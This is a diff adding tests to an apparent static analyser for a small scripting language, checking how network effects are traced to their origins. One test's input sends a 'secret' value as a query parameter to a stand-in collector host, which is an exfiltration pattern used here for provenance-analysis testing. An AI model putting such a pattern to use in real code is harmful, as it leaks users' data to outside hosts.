@@ -998,6 +998,30 @@ def test_fixed_point_terminates_on_mutual_recursion_with_derivation():
     assert s.functions["pong"]
 
 
+def test_derivation_of_returns_the_effect_node():
+    s = analyse('use http\nx = ask "https://example.com/a.json"')
+    e = s.at("network")[0]
+    assert s.derivation_of(e) is e.derivation
+    assert s.derivation_of(e).kind == "literal"
+
+
+def test_origins_of_finds_a_named_parameter():
+    s = analyse('use http\n'
+                'to send of payload:\n'
+                '  give ask "https://collector.example.com/?d=" + payload\n\n'
+                'x = send of "secret"\n')
+    e = s.at("network")[0]
+    origins = s.origins_of(e)
+    names = {n for n, _f in origins}
+    assert "payload" in names
+
+
+def test_origins_of_empty_for_a_bare_literal():
+    s = analyse('use http\nx = ask "https://example.com/a.json"')
+    e = s.at("network")[0]
+    assert s.origins_of(e) == []
+
+
 def test_effect_derivation_excluded_from_equality():
     """Two structurally identical effects with different derivations must
     still compare equal and hash the same, or the fixed point may not
